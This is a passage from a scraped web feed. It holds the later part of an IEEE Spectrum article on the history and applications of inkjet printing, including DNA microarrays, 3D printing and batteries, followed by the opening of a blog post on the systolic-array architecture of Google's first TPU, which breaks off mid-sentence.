entirely within the printhead.</small><small placeholder="Add Photo Credit...">HP</small></p><p>
	This technology is called continuous inkjet printing, and by 1976 IBM had incorporated it in a commercial printer, the 
	<a href="https://en.wikipedia.org/wiki/IBM_6640" rel="noopener noreferrer" target="_blank">IBM 6640</a>. But continuous inkjets lose ink to evaporation even when recycling is used, limiting their appeal.
</p><p>
	To get around the wastefulness of continuous inkjets, others worked on developing drop-on-demand inkjet printers, where each orifice on the printhead emits one drop of ink at a time, avoiding the waste of a continual flow of drops. Surface tension holds the ink in place in a tiny open nozzle until a mechanism pushes the ink to eject a drop. Each drop hitting the paper creates a dot, and moving the printhead back and forth builds up an image. A printhead with multiple orifices can emit many drops of ink simultaneously, so each pass of the printhead across the page adds a strip of the image, not just a single drop-thin line.
</p><p>
	In the late 1970s, Siemens was the first to sell a drop-on-demand inkjet printer. It came not as a stand-alone device like a modern desktop printer, but as an integral part of a computer terminal, the 
	<a href="https://de.wikipedia.org/wiki/Siemens_PT80i" rel="noopener noreferrer" target="_blank">Siemens PT80i</a> (Printer Terminal 80 Inkjet). The printer used piezoelectric actuators surrounding 12 ink tubes, which fed 12 nozzles to shoot ink droplets, printing 270 characters per second.
</p><p><a href="https://en.wikipedia.org/wiki/Piezoelectricity" rel="noopener noreferrer" target="_blank">Piezoelectric</a> devices rely on how some materials, such as ceramic lead-zirconate-titanate (PZT), change shape when subjected to a voltage. This effect has proved extremely useful in MEMS in general, for generating precise forces and motion on command. If a layer of PZT is bonded to a nonpiezoelectric material, forming what’s called a bimorph, it will bend when exposed to a voltage. In the piezoelectric inkjet nozzle, the bending of the bimorph pushes ink out of the orifice. [For another application of piezoelectric MEMS technology, see “<a href="https://spectrum.ieee.org/mems-ultrasound-history" target="_blank">How Ultrasound Became Ultra Small</a>.”]
</p><p data-rm-resized-container="25%"><img id="6b341" data-rm-shortcode-id="9dc5754ed36bf2b592d6a19609da2eb1" data-rm-shortcode-name="rebelmouse-image" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/photo-of-hp-jet-fusion-5200-3d-printer.jpg?id=51828514&amp;width=980" data-runner-src="https://spectrum.ieee.org/media-library/photo-of-hp-jet-fusion-5200-3d-printer.jpg?id=51828514&amp;width=980" width="1500" height="1000" alt="Photo of HP Jet Fusion 5200 3D printer"><small placeholder="Add Photo Caption...">The HP Jet Fusion 5200 industrial 3D printer uses an inkjet process to build parts out of nylon, polypropylene, or polyurethane.</small><small placeholder="Add Photo Credit...">HP</small></p><p>
	This novel printing technology, however, was not yet as dependable as proven impact printers in the 1970s, and the whole Siemens terminal became unusable if the printer failed, so it didn’t catch on.
</p><p>
	Meanwhile, researchers at both Hewlett-Packard and Canon noticed that ink would boil and splatter when exposed to a hot element like a soldering iron, and they decided to turn that splattering into a useful inkjet printing mechanism. They knew that a resistor could be used as a heating element and could be miniaturized with the same technology as that used for integrated circuits. In the printers they built, each ink nozzle contains a resistor instead of a piezoelectric actuator. An electrical pulse heats the resistor, which flash-boils a thin layer of the ink, forming a rapidly expanding vapor bubble that pushes a droplet of ink out through the orifice.
</p><p>
	This work led to two <a href="https://www.hp.com/hpinfo/abouthp/histnfacts/museum/imagingprinting/0011/index.html" target="_blank">competing</a>&nbsp;<a href="https://global.canon/en/news/2015/aug26e2.html" target="_blank">versions</a> of thermal inkjet technology coming to market at nearly the same time 40 years ago. (The same year, 1984, Epson introduced a stand-alone 
	<a href="https://corporate.epson/en/about/history/milestone-products/1984-10-sq2000.html" rel="noopener noreferrer" target="_blank">piezoelectric inkjet printer</a>.)
</p><p>
	Hewlett-Packard’s 
	<a href="https://www.hp.com/hpinfo/abouthp/histnfacts/museum/imagingprinting/0011/index.html" rel="noopener noreferrer" target="_blank">HP ThinkJet</a> was its first desktop inkjet printer based on its thermal technology, and it was designed to connect to a personal computer for everyday printing. It had an immediate advantage over the recently developed laser printers: It was much cheaper. A desktop laser printer from HP cost US $3,500 (about $10,500 today); HP’s 2225A ThinkJet cost only $495 ($1,500 today). Inkjet printers also used far less power than laser printers did and were quieter. Admittedly, inkjets didn’t have great resolution—96 dpi compared with 300 for laser printers in those early days—and they were slow.
</p><p>
	But the advantages outweighed the disadvantages (more so as the technology improved), and inkjet printers came to dominate the desktop and home printer markets. Today, more than 20 companies make inkjet printers, generating a market of 
	<a href="https://www.researchandmarkets.com/report/inkjet-printing" rel="noopener noreferrer" target="_blank">more than $100 billion</a> annually and continuing to grow at more than 8 percent per year.
</p><h2>Printing DNA Microarrays With Inkjets</h2><p>
	While the business of making inkjet printers matured and grew, some companies began exploring what other kinds of “ink” might be delivered with an inkjet. One of these was Agilent Technologies, a spin-off of Hewlett Packard with a focus on life-science and chemical-analysis technologies. Agilent developed a way to print strands of DNA from the four nucleic acid bases—cytosine (C), guanine (G), adenine (A), and thymine (T). Specifically, the company adapted existing DNA chemistries plus inkjet printing techniques to build 
	<a href="https://www.agilent.com/library/applications/5989-9159en_lo.pdf" rel="noopener noreferrer" target="_blank">microarrays of DNA</a> on glass slides for <a href="https://journals.asm.org/doi/10.1128/cmr.00019-09" rel="noopener noreferrer" target="_blank">genomics work</a>, such as measuring which genes are being expressed in an organism under various conditions. Academic researchers have shared open-source methods for <a href="https://genomebiology.biomedcentral.com/articles/10.1186/gb-2004-5-8-r58" rel="noopener noreferrer" target="_blank">converting existing inkjet printers</a> to build their own microarrays, albeit with specs that are much more modest than the commercial systems.
</p><p>
	A DNA microarray consists of a substrate, usually glass, with an array of small regions called spots where DNA strands are attached. Agilent produces arrays with as many as a million spots on a single 2.5-by-7.6-cm slide. An open-source system puts up to 10,000 in a somewhat smaller area. Each DNA strand is made of sequences of the bases C, G, A, and T. In double-stranded DNA, the strands have complementary sequences, which join up like rungs of a ladder, C joining with G, and A with T.
</p><p>
	A DNA microarray uses single-stranded DNA, and each spot has millions of strands with a common sequence. When a sample with copies of the complementary strand washes over the spot, those strands bind together with the strands anchored in the spot. The sample strands are tagged with fluorescent molecules, and the user learns which DNA sequences were present in the sample by examining which spots light up.
</p><p>
	In Agilent’s method for fabricating a microarray, the printer makes multiple passes over the substrate, each pass adding one base to each strand in the spots, with intermediate steps to prepare for the next pass.
</p><p>
	Adding a base is actually a three-step process. Each of the growing strands in the microarray spots has a molecular “cap” at the end that prevents the indiscriminate addition of more bases. So the first step is to remove or deactivate those caps by washing a solution over the nascent microarray. The second step is analogous to printing a page: At each spot on the microarray, the inkjet adds a dot of liquid containing the next monomer molecule (modified versions of C, G, A, or T) to be added to the end of the strand. These monomers each include a new cap so that only one molecule gets added to each strand. Although the newly added monomers are now attached to the strands, the connection is not fully stable, and so the third step applies an oxidizer solution that modifies the bonds, fully integrating the new monomers into the DNA structure. Rinse and repeat.
</p><p>
	The versatility of the open-source inkjet construction allows researchers to rapidly build prototype arrays with whatever sequences they want to try out. A new array can be designed, synthesized, and used to analyze DNA in a single day. 
	<a href="https://genomebiology.biomedcentral.com/articles/10.1186/gb-2004-5-8-r58" rel="noopener noreferrer" target="_blank">One group</a> reported a cycle time of 10 to 20 minutes to attach each base with their system, or about 13 hours to produce a batch of arrays, each with about 10,000 spots containing 40-base strands. For comparison’s sake, Agilent’s commercial microarrays typically have strands up to 60 bases long.
</p><p>
	Agilent also uses its inkjet system to synthesize another genomic workhorse known as an 
	<a href="https://www.agilent.com/en/solutions/genomics-applications-solutions/ols" rel="noopener noreferrer" target="_blank">oligonucleotide library</a>. The process is the same as for making a microarray, but at the end all the strands are cleaved from the substrate, dried, and packaged together in a single tube for the customer. Agilent’s inkjet-printed libraries have strands up to about 230 bases long.
</p><h2>3D Printing Using Two Inkjet Inks</h2><p data-rm-resized-container="25%"><img id="af069" data-rm-shortcode-id="de7c5b7b70ea177c31bc03ec6bead9f9" data-rm-shortcode-name="rebelmouse-image" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/image.jpg?id=51816255&amp;width=980" data-runner-src="https://spectrum.ieee.org/media-library/image.jpg?id=51816255&amp;width=980" width="1500" height="1695" alt=""></p><p data-rm-resized-container="25%"><img id="045e7" data-rm-shortcode-id="05f52304492d1a9437f387ef7bcf4ab6" data-rm-shortcode-name="rebelmouse-image" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/photos-of-3d-printed-objects.png?id=51816253&amp;width=980" data-runner-src="https://spectrum.ieee.org/media-library/photos-of-3d-printed-objects.png?id=51816253&amp;width=980" width="1500" height="1128" alt="Photos of 3D printed objects"><small placeholder="Add Photo Caption...">Invent Medical—a Czech Republic startup partnered with HP—custom printed this helmet for correcting head-shape deformities [top]. An HP Jet Fusion 5200 printed this lipstick holder [bottom].</small><small placeholder="Add Photo Credit...">Top: Invent Medical/HP; bottom: YOO Makeup/HP</small></p><p>
	In addition to printing two-dimensional pages and building one-dimensional molecular strands, inkjet technology has for many years been used to produce three-dimensional objects. One approach is a variant of powder-bed 3D printing, in which objects are built up by fusing or binding layers of powder in the desired pattern. The inkjet printhead applies droplets of a liquid binding agent to each layer of powder in the regions that will form the finished 3D items.</p><p>The <a href="https://www.hp.com/us-en/printers/3d-printers/products/multi-jet-technology.html" rel="noopener noreferrer" target="_blank">HP Multi Jet Fusion (MJF)</a> line of 3D printers extends this approach by depositing two types of ink: One is a binding promoter and the other a detailing agent, which is applied at the edges of the pattern to prevent the promoter from bleeding into the surrounding powder. A printhead carrying a wide array of inkjet nozzles dispenses these inks, and the array is quickly followed by a lighting bar to heat the powder, fusing it in the regions where the binding promoter is present. A fresh layer of powder is then spread over the entire printing area in readiness for the next cycle of the process. At the end, compressed air and a vacuum hose remove the unfused powder to reveal the completed 3D objects. The HP MJF printers perform this in a volume of up to 38 by 28 by 38 cm.</p><p data-rm-resized-container="25%"><img id="49468" data-rm-shortcode-id="8807012fcdad4f97b39c08dc12e24c17" data-rm-shortcode-name="rebelmouse-image" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/photo-of-a-3d-printed-vacuum.jpg?id=51828525&amp;width=980" data-runner-src="https://spectrum.ieee.org/media-library/photo-of-a-3d-printed-vacuum.jpg?id=51828525&amp;width=980" width="2000" height="1392" alt="Photo of a 3D printed vacuum."><small placeholder="Add Photo Caption...">This model of a handheld vacuum cleaner with colored, translucent, and transparent parts was printed in one piece on a Mimaki inkjet 3D printer.</small><small placeholder="Add Photo Credit...">Mimaki Engineering Co.</small></p><p>A quite different approach has been taken by 
	<a href="https://mimaki.com/" rel="noopener noreferrer" target="_blank">Mimaki Engineering Co.</a> of Japan, which has introduced <a href="https://www.mimakiusa.com/products/3d/3duj-553/" target="_blank">3D printers</a> with piezoelectric inkjet heads that dispense droplets of resin. The resins are photopolymers that are cured by ultraviolet light-emitting diodes after each layer is printed. Instead of using a powder bed that fills the entire build area, the printer deposits the resins on top of the growing structure. To deal with steep overhangs—such as an outstretched arm of a figurine—one of the resins produces a water-soluble material, which is used to build supports where needed. After the build is finished, these supports can be dissolved away.
</p><p>
	Seven other resins provide colors that can include CMYK—the familiar cyan, magenta, yellow, and black inks of consumer inkjet printers—as well as white and clear, for a total of 10 million color combinations, comparable to the color depth that the human eye can discriminate. The resulting parts can combine solid color, colored transparency and translucency, and colorless transparency.
</p><p>
	The printer provides a volume for building that measures 51 by 51 by 30 cm. Unlike with a powder-bed machine, small test parts can be made without filling the entire volume. In general, however, the Mimaki approach is slower than that of the HP MJF because it uses smaller printheads instead of a wide one that can cross the entire area in one sweep.
</p><h2>Inkjet’s Future</h2><p>
	Inkjet printing’s strength is the ability to pattern various inks over large areas in short, rapid production runs at a reasonable cost. It cannot generally compete with standard high-volume production approaches, because those will usually be cheaper. Thus, a car enthusiast, for instance, may embrace 3D inkjet printing to make bespoke parts for repairs or other tinkering, but a high-volume car-parts manufacturer is not going to introduce such printers to its factory lines. Similarly, a company may build individual figurines from a customer’s design, printed by 3D inkjet, but the same technique won’t be economical for mass-producing models of the latest superhero. With many potential applications, it isn’t clear if there is a niche where the inkjet approach will win.
</p><p>
	An example is the use of 3D inkjet printing for 
	<a href="https://www.researchgate.net/publication/348562139_3D_Printing_as_a_Promising_Tool_in_Personalized_Medicine" rel="noopener noreferrer" target="_blank">personalized medicine</a>. The idea is to produce tablets of a medication customized for a specific patient. Such personalized pills can include simple fine-tuning of the dose for an individual, as well as adjustments to the drug’s release rate—from very rapid to slow and sustained—through modifications to the binding agents and structure of the tablet. Rather than juggling multiple medications on a complicated schedule each day, a patient could take a single daily polypill—a 3D-printed tablet containing multiple medications, each with a different rate of release.
</p><p>
	Researchers are exploring how to adapt existing 3D printing techniques, including inkjet, to make these personalized medications. Inkjet systems are particularly suited for printing drugs in the form of thin films, such as transdermal patches to be applied to the skin and buccal films to be held in the cheek, where drugs can pass directly to the bloodstream without first going through the digestive system.
</p><p><img id="cb401" data-rm-shortcode-id="20c0c8188de16d7dbdd111b77709f19b" data-rm-shortcode-name="rebelmouse-image" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/diagram-illustrating-use-of-inkjet-to-build-a-dna-microarray.png?id=51816847&amp;width=980" data-runner-src="https://spectrum.ieee.org/media-library/diagram-illustrating-use-of-inkjet-to-build-a-dna-microarray.png?id=51816847&amp;width=980" width="1500" height="728" alt="Diagram illustrating use of inkjet to build a DNA microarray."><small placeholder="Add Photo Caption...">A DNA microarray can be fabricated using an inkjet system to build custom-designed strands of DNA at each spot of the array. The printhead delivers a droplet of “ink” [left] containing modified monomers of one nucleotide [G, C, A, or T] to each spot. On the first print cycle, these monomers attach to the chemically treated glass surface. On subsequent print runs [right], a single monomer joins on the end of each growing DNA strand. Each monomer includes a protective cap to prevent other monomers from joining. Additional processes [not depicted here] wash away the nucleotide ink, apply a catalyst to complete the monomer bonding, and strip away the protective caps in preparation for the next printing step.</small><small placeholder="Add Photo Credit...">Chris Philpot</small></p><p>
	These printed personalized medicines, however, would be expensive compared to fixed doses rolling off standard high-volume production lines. Thus the technique is likely to be reserved for relatively rare conditions.
</p><p>
	Another potential application of 3D inkjet printing is in the <a href="https://doi.org/10.1016/j.heliyon.2022.e12623" target="_blank">fabrication of advanced lithium-ion batteries</a>. The charging and discharging of these batteries relies on lithium ions moving from the battery’s electrodes to its electrolyte and back again, in the process releasing or absorbing electrons that produce the current flow. The energy-storage density of the standard electrode design can be increased by using thicker electrodes, but this compromises the power density—the rate of energy release—because a smaller proportion of the electrode is in close contact with the electrolyte.
</p><p>
	A 3D inkjet could build electrodes with a detailed microstructure that allows the electrolyte to penetrate throughout the electrode volume. This could boost the ability of the active lithium ions and electrons to reach the entire electrode efficiently even when the electrode is larger, thereby increasing the energy storage and power density in tandem. For this vision to become a reality, however, researchers will need to learn more about how to formulate the “inks” for printing these electrodes: What are the best particle sizes and solvents to make an ink with fluid properties suitable for use in an inkjet system and that will produce stable printed structures with good electrochemical properties?
</p><p>
	We think it is unlikely, however, that inkjet printing could compete with high-volume manufacturing on price. Inkjet printing of prototypes, on the other hand, may uncover an optimal battery design that can then be adapted for production by conventional techniques.
</p><p>
	 Inkjet systems have been demonstrated for a wide variety of applications beyond what we have discussed above: 
	<a href="https://doi.org/10.1016/j.bprint.2021.e00157" rel="noopener noreferrer" target="_blank">Living cells can be printed</a>, for instance, to form tissue structures for in vitro experiments. MEMS such as <a href="https://ieeexplore.ieee.org/abstract/document/982863" rel="noopener noreferrer" target="_blank">microscopic motors</a> have been printed using inks containing nanoparticles of gold and silver as conductors and resin-based inks to act as insulators. <a href="https://doi.org/10.1038/s41598-020-59432-2" rel="noopener noreferrer" target="_blank">Flexible sensors</a> for health care monitoring have been printed using an electrically conducting polymer that responds to temperature differentials. And then there are all the ways inkjets are used to create images on media other than office printouts, such as printing of textiles, <a href="https://www.sae.org/site/news/2021/03/abb-inkjet-type-printers-enable-custom-automotive-paint-jobs" rel="noopener noreferrer" target="_blank">inkjet robots</a> to apply custom automotive paint jobs, and the “<a href="https://en.wikipedia.org/wiki/Gicl%C3%A9e" rel="noopener noreferrer" target="_blank">Giclée</a>” printing of fine art using archival-quality inks and substrates.
</p><p>
	Each of these applications is like a colored dot on the vast canvas of human technology and activity. And while the dots from inkjets, powered by MEMS, may be only a single color among many others on that metaphorical page, the picture would be very different without them. 
	<span></span></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Google's First Tensor Processing Unit: Architecture (323 pts)]]></title>
            <link>https://thechipletter.substack.com/p/googles-first-tpu-architecture</link>
            <guid>39822184</guid>
            <pubDate>Mon, 25 Mar 2024 22:56:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://thechipletter.substack.com/p/googles-first-tpu-architecture">https://thechipletter.substack.com/p/googles-first-tpu-architecture</a>, See on <a href="https://news.ycombinator.com/item?id=39822184">Hacker News</a></p>
<div id="readability-page-1" class="page"><div dir="auto"><p>… we say tongue-in-cheek that TPU v1 “launched a thousand chips.”</p><p><span>In </span><a href="https://thechipletter.substack.com/p/googles-first-tensor-processing-unit" rel="">Google’s First Tensor Processing Unit - Origins</a><span>, we saw why and how Google developed the first Tensor Processing Unit (or TPU v1) in just 15 months, starting in late 2013. </span></p><div data-component-name="DigestPostEmbed"><a href="https://thechipletter.substack.com/p/googles-first-tensor-processing-unit" target="_blank" rel="noopener"></a><div><a href="https://thechipletter.substack.com/p/googles-first-tensor-processing-unit" target="_blank" rel="noopener"><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,h_212,c_fill,f_webp,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fede3c6cd-726f-4a26-995d-d2981d47a725_1600x923.png 424w, https://substackcdn.com/image/fetch/w_848,h_424,c_fill,f_webp,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fede3c6cd-726f-4a26-995d-d2981d47a725_1600x923.png 848w, https://substackcdn.com/image/fetch/w_1272,h_636,c_fill,f_webp,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fede3c6cd-726f-4a26-995d-d2981d47a725_1600x923.png 1272w, https://substackcdn.com/image/fetch/w_1300,h_650,c_fill,f_webp,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fede3c6cd-726f-4a26-995d-d2981d47a725_1600x923.png 1300w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1300,h_650,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fede3c6cd-726f-4a26-995d-d2981d47a725_1600x923.png" sizes="100vw" alt="Google's First Tensor Processing Unit : Origins" srcset="https://substackcdn.com/image/fetch/w_424,h_212,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fede3c6cd-726f-4a26-995d-d2981d47a725_1600x923.png 424w, https://substackcdn.com/image/fetch/w_848,h_424,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fede3c6cd-726f-4a26-995d-d2981d47a725_1600x923.png 848w, https://substackcdn.com/image/fetch/w_1272,h_636,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fede3c6cd-726f-4a26-995d-d2981d47a725_1600x923.png 1272w, https://substackcdn.com/image/fetch/w_1300,h_650,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fede3c6cd-726f-4a26-995d-d2981d47a725_1600x923.png 1300w" width="1300" height="650"></picture></a></div></div><p>Today’s post will look in more detail at the architecture that emerged from that work and at its performance.</p><p data-attrs="{&quot;url&quot;:&quot;https://thechipletter.substack.com/p/googles-first-tpu-architecture?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;action&quot;:null,&quot;class&quot;:null}" data-component-name="ButtonCreateButton"><a href="https://thechipletter.substack.com/p/googles-first-tpu-architecture?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share" rel=""><span>Share</span></a></p><p>A quick reminder of the objectives of the TPU v1 project. As Google saw not only the opportunities provided by a new range of services using Deep Learning but also the huge scale and the cost of the hardware that would be needed to power these services, the aims of the project would be …&nbsp;</p><blockquote><p>… to develop an Application Specific Integrated Circuit (ASIC) that would generate a 10x cost-performance advantage on inference when compared to GPUs.</p></blockquote><p>and to …&nbsp;</p><blockquote><p><span>Build it quickly</span><br><span>Achieve high performance</span><br><span>......at scale</span><br><span>...for new workloads out-of-the-box...</span><br><span>all while being cost-effective</span></p></blockquote><p>Before we look at the TPU v1 that emerged from the project in more detail, a brief reminder of the Tensor operations that give the TPU its name.</p><blockquote><p>Why is a Tensor Processing Unit so called? Because it is designed to speed up operations involving tensors. Precisely, what operations though? The operations are referred to … as a “map (multilinear relationship) between different objects such as vectors, scalars, and even other tensors”.</p><p>Let’s take a simple example. A two-dimensional array can describe a multilinear relationship between two one-dimensional arrays. The mathematically inclined will recognize the process of getting from one vector to the other as multiplying a vector by a matrix to get another vector.</p><p>This can be generalized to tensors representing the relationship between higher dimensional arrays. However, although tensors describe the relationship between arbitrary higher-dimensional arrays, in practice the TPU hardware that we will consider is designed to perform calculations associated with one and two-dimensional arrays. Or, more specifically, vector and matrix operations.</p></blockquote><p>Let’s look at one of these operations, matrix multiplication. If we take two 2x2 matrices (2x2 arrays) then we multiply them together to get another 2x2 matrix by multiplying the elements as follows.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3f62b15d-8198-4c20-90f4-ebbad9203299_1350x262.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3f62b15d-8198-4c20-90f4-ebbad9203299_1350x262.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3f62b15d-8198-4c20-90f4-ebbad9203299_1350x262.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3f62b15d-8198-4c20-90f4-ebbad9203299_1350x262.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3f62b15d-8198-4c20-90f4-ebbad9203299_1350x262.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3f62b15d-8198-4c20-90f4-ebbad9203299_1350x262.png" width="1350" height="262" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/3f62b15d-8198-4c20-90f4-ebbad9203299_1350x262.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:262,&quot;width&quot;:1350,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3f62b15d-8198-4c20-90f4-ebbad9203299_1350x262.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3f62b15d-8198-4c20-90f4-ebbad9203299_1350x262.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3f62b15d-8198-4c20-90f4-ebbad9203299_1350x262.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3f62b15d-8198-4c20-90f4-ebbad9203299_1350x262.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Why are matrix multiplications key to the operation of neural networks? We can look at a simple neural network with four layers as follows (only the connections from the first node in each later layer are shown for simplicity):&nbsp;</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F51407b73-27d7-42ba-ad4d-043f25b7633d_1580x1264.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F51407b73-27d7-42ba-ad4d-043f25b7633d_1580x1264.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F51407b73-27d7-42ba-ad4d-043f25b7633d_1580x1264.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F51407b73-27d7-42ba-ad4d-043f25b7633d_1580x1264.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F51407b73-27d7-42ba-ad4d-043f25b7633d_1580x1264.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F51407b73-27d7-42ba-ad4d-043f25b7633d_1580x1264.jpeg" width="1456" height="1165" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/51407b73-27d7-42ba-ad4d-043f25b7633d_1580x1264.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1165,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:120924,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F51407b73-27d7-42ba-ad4d-043f25b7633d_1580x1264.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F51407b73-27d7-42ba-ad4d-043f25b7633d_1580x1264.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F51407b73-27d7-42ba-ad4d-043f25b7633d_1580x1264.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F51407b73-27d7-42ba-ad4d-043f25b7633d_1580x1264.jpeg 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><span>Where ‘f’ here is the </span><a href="https://en.wikipedia.org/wiki/Activation_function" rel="">activation function</a><span>.</span></p><p>So the hidden and output layers are the results of applying the activation function to each element of the vector which is the result of multiplying the vector of input values times the matrix of weights. With a number of data inputs this is equivalent to applying the activation function to each entry in a matrix that is the result of a matrix multiplication.</p><p><span>As we’ve seen, the approach adopted by the TPU v1 team was an architecture first set out by H.T Kung and Charles E. Leiserson in their 1978 paper </span><a href="https://www.eecs.harvard.edu/htk/static/files/1978-cmu-cs-report-kung-leiserson.pdf" rel="">Systolic Arrays (for VLSI)</a><span>.</span></p><blockquote><p>A systolic system is a network of processors which rhythmically compute and pass data through the system….In a systolic computer system, the function of a processor is analogous to that of the heart. Every processor regularly pumps data in and out, each time performing some short computation so that a regular flow of data is kept up in the network.</p></blockquote><p>So how is the systolic approach used in the TPU v1 to efficiently perform matrix multiplications? Let’s return to our 2x2 matrix multiplication example.</p><p>If we have a 2x2 array of multiplication units that are connected in a simple grid, and we feed the elements of the matrices that we are multiplying, into the grid in the right order then the results of the matrix 